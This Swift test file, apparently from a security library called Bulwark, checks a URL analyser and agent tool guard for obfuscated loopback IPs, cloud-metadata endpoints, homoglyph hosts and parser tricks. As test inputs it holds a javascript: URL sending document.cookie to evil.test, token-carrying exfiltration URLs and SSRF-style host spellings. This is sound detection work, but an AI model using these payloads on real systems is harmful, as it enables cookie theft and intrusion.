import XCTest
@testable import Bulwark

/// URL analysis: where does this actually point, and what is riding along?
final class URLCheckTests: XCTestCase {
    private func categories(_ url: String, options: URLCheckOptions = URLCheckOptions()) -> Set<String> {
        Set(analyzeURL(url, options: options).findings.map { $0.category })
    }

    // MARK: - IPv4 canonicalization

    func testEveryInetAtonSpellingOfLoopbackCanonicalizes() {
        for spelling in ["127.0.0.1", "2130706433", "0177.0.0.1", "0x7f.0.0.1", "127.1", "127.0.1"] {
            XCTAssertEqual(parseIPv4(spelling).map(ipv4ToString), "127.0.0.1", spelling)
        }
    }

    func testNonAddressesAreRejected() {
        for text in ["1.2.3.4.5", "999.1.1.1", "example.com", "", "1.2.3.4a", "0x"] {
            XCTAssertNil(parseIPv4(text), text)
        }
    }

    func testPublicAddressesSurviveCanonicalization() {
        XCTAssertEqual(parseIPv4("8.8.8.8").map(ipv4ToString), "8.8.8.8")
        XCTAssertFalse(isPrivateHost("8.8.8.8"))
    }

    /// Swift's own `UInt64(_:radix:)` only knows ASCII digits, but a browser
    /// NFKC-maps Arabic-Indic and fullwidth digits before resolving, so these
    /// spellings reach the loopback address too.
    func testUnicodeDigitSpellingsAreStillAddresses() {
        XCTAssertEqual(parseIPv4("١٢٧.0.0.1").map(ipv4ToString), "127.0.0.1")
        XCTAssertTrue(isPrivateHost("١٢٧.0.0.1"))
    }

    // MARK: - Private and metadata hosts

    func testPrivateRangesAreRecognizedInEverySpelling() {
        for host in ["127.0.0.1", "2130706433", "10.1.2.3", "192.168.0.5", "172.16.4.4",
                     "169.254.1.1", "100.64.0.1", "0.0.0.0", "localhost", "db.internal",
                     "printer.local", "mybox", "[::1]", "[fe80::1]", "[fd00::1]",
                     "[::ffff:127.0.0.1]"] {
            XCTAssertTrue(isPrivateHost(host), host)
        }
    }

    func testPublicHostsAreNotPrivate() {
        for host in ["example.com", "8.8.8.8", "www.reuters.com", "[2606:4700::1111]"] {
            XCTAssertFalse(isPrivateHost(host), host)
        }
    }

    func testCloudMetadataEndpointsAreSingledOut() {
        for host in ["169.254.169.254", "metadata.google.internal", "100.100.100.200", "192.0.0.192"] {
            XCTAssertTrue(isMetadataHost(host), host)
        }
        XCTAssertTrue(categories("http://169.254.169.254/latest/meta-data/").contains("url_metadata_endpoint"))
    }

    func testObfuscatedPrivateIPIsReportedAsObfuscated() {
        let cats = categories("http://2130706433/admin")
        XCTAssertTrue(cats.contains("url_private_host"))
        XCTAssertTrue(cats.contains("url_obfuscated_ip"))
    }

    // MARK: - Deceptive hosts

    func testUserinfoCannotDisguiseTheDestination() {
        let assessment = analyzeURL("https://trusted.example.com@attacker.test/collect")
        XCTAssertEqual(assessment.canonicalHost, "attacker.test")
        XCTAssertTrue(assessment.hasCredentials)
        XCTAssertTrue(assessment.findings.contains { $0.category == "url_credentials" })
    }

    func testRepeatedAtSignsResolveToTheLastHost() {
        XCTAssertEqual(analyzeURL("https://a@b@attacker.test/x").canonicalHost, "attacker.test")
    }

    func testPunycodeAndMixedScriptHostsAreFlagged() {
        XCTAssertTrue(categories("https://xn--pple-43d.com/login").contains("url_punycode"))
        XCTAssertTrue(categories("https://аpple.com/login").contains("url_mixed_script"))   // Cyrillic а
    }

    func testActiveSchemesAreCriticalAndDoNotDoubleReport() {
        let cats = categories(#"javascript:fetch("//evil.test/?d="+document.cookie)"#)
        XCTAssertTrue(cats.contains("url_active_scheme"))
        XCTAssertFalse(cats.contains("url_malformed"))
    }

    func testTrailingDotDoesNotDefeatTheHostCheck() {
        XCTAssertTrue(isPrivateHost("localhost."))
    }

    // MARK: - Data-carrying URLs

    private static let blob = "eyJjb252ZXJzYXRpb24iOiJzZWNyZXQtdG9rZW4tMTIzNDU2Nzg5MCJ9"

    func testPayloadIsCaughtInQueryPathFragmentAndSubdomain() {
        let blob = Self.blob
        for url in ["https://evil.test/?d=\(blob)", "https://evil.test/\(blob)",
                    "https://evil.test/#\(blob)", "https://\(blob).evil.test/"] {
            XCTAssertTrue(categories(url).contains("url_opaque_payload"), url)
        }
    }

    func testOrdinaryURLsStayClean() {
        for url in [
            "https://example.com/article",
            "https://www.reuters.com/world/europe/story-2026-07-29/",
            "https://cdn.jsdelivr.net/npm/pkg@1.2.3/dist/index.min.js",
            "https://docs.example.com/guide?utm_source=newsletter&utm_campaign=summer2026",
            "https://api.github.com/repos/o/r/actions/workflows/ci.yml?query=branch%3Amain",
        ] {
            XCTAssertTrue(analyzeURL(url).safe, url)
        }
    }

    func testOverlongURLsAreFlagged() {
        let url = "https://evil.test/?d=" + String(repeating: "A", count: 3000)
        XCTAssertTrue(categories(url, options: URLCheckOptions(maxOpaque: 0)).contains("url_length"))
    }

    // MARK: - Parsing

    func testSplitURLHandlesPortsPathsQueriesAndFragments() {
        let parts = splitURL("https://user:pw@example.com:8443/a/b?x=1&y=2#frag")
        XCTAssertEqual(parts.scheme, "https")
        XCTAssertEqual(parts.userinfo, "user:pw")
        XCTAssertEqual(parts.host, "example.com")
        XCTAssertEqual(parts.port, 8443)
        XCTAssertEqual(parts.path, "/a/b")
        XCTAssertEqual(parts.query, "x=1&y=2")
        XCTAssertEqual(parts.fragment, "frag")
    }

    func testIPv6LiteralsKeepTheirBracketsAndPort() {
        let parts = splitURL("http://[::1]:9000/x")
        XCTAssertEqual(parts.host, "[::1]")
        XCTAssertEqual(parts.port, 9000)
    }

    func testBareAndSchemeRelativeValuesAreParsed() {
        XCTAssertEqual(splitURL("evil.test/path").host, "evil.test")
        XCTAssertEqual(splitURL("//evil.test/path").host, "evil.test")
    }

    func testWhitespaceInsideAURLIsStrippedNotTrusted() {
        // Parser differentials start here: one component sees a host, another sees
        // something else. Normalize before classifying.
        XCTAssertEqual(splitURL("http://evil\n.test/x").host, "evil.test")
        XCTAssertEqual(splitURL("http://evil\u{200B}.test/x").host, "evil.test")
    }

    /// Swift's `String` methods work on grapheme clusters, so a separator followed by
    /// a combining mark is one `Character` and does not split. The reference
    /// implementation works on code points, and so must this: otherwise
    /// `evil.<combining acute>attacker.test` reads as a single label — an unsplit
    /// single-label host, which the local-search-domain rule then calls private,
    /// while the registrable domain is never examined at all.
    func testCombiningMarksDoNotWeldLabelsTogether() {
        let host = "evil.\u{0301}attacker.test"
        let (kind, canonical) = classifyHost(host)
        XCTAssertEqual(kind, .domain)
        XCTAssertEqual(canonical, host)
        XCTAssertFalse(isPrivateHost(host))

        // The same hazard on ':' would hide an IPv6 literal, and on '%' would keep a
        // zone id glued to the IPv4-mapped address it hides.
        XCTAssertEqual(classifyHost("a:\u{0308}b").kind, .ipv6)
        XCTAssertTrue(isPrivateHost("[::ffff:127.0.0.1%\u{0301}zone]"))

        // And on the ':' that separates a username from a password.
        let assessment = analyzeURL("https://user:\u{0308}pw@attacker.test/")
        XCTAssertTrue(assessment.findings.contains { $0.message.contains("not 'user'") })
    }

    /// The label pattern's `$` in the reference implementation also matches just
    /// before a single trailing newline, so a host must be read the same way here.
    func testTrailingNewlineStillReadsAsALabel() {
        XCTAssertEqual(classifyHost("mybox\n").kind, .domain)
        XCTAssertTrue(isPrivateHost("mybox\n"))
        XCTAssertEqual(classifyHost("mybox\n\n").kind, .malformed)
        XCTAssertEqual(classifyHost("my\nbox").kind, .malformed)
    }

    func testClassifyHostLabelsKinds() {
        XCTAssertEqual(classifyHost("example.com").kind, .domain)
        XCTAssertEqual(classifyHost("127.0.0.1").kind, .ipv4)
        XCTAssertEqual(classifyHost("[::1]").kind, .ipv6)
        XCTAssertEqual(classifyHost("").kind, .empty)
    }

    // MARK: - One canonicalizer

    func testToolGuardSharesThisCanonicalizer() {
        XCTAssertEqual(ToolGuard.canonicalIPv4("0177.0.0.1"), parseIPv4("0177.0.0.1"))
        // ToolGuard's URL argument checks read the same host classifier, so an
        // obfuscated loopback is refused there too.
        let check = ToolGuard().checkCall(tool: "fetch", risk: .navigate,
                                          arguments: ["url": "http://0x7f.0.0.1/admin"])
        XCTAssertEqual(check.verdict, .block)
    }
}
